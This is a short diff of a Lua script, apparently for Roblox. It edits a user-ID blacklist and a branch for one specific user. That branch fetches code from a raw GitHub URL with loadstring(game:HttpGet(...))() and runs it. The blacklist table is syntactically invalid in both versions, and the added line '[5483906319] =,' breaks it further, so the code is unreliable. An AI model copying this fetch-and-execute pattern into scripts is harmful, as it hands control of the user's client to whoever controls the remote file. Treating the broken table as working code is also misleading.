@@ -1,5 +1,5 @@
 local BlackList = {
-    [5483906319], -- 23_jesko
+    [5483906319] =, -- 23_jesko
     [2347956184] -- Zar0
 }
 local gameId = game.PlaceId
@@ -108,8 +108,7 @@ else
     -- Special condition for specific user
     if plr.UserId == 1935923708 then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Aberthegod/W/refs/heads/main/nub"))()
-    else
-        warn("You not Hunter ok Next function")
+        return
     end
     task.wait(2)
     if not BlackList[plr.UserId] then
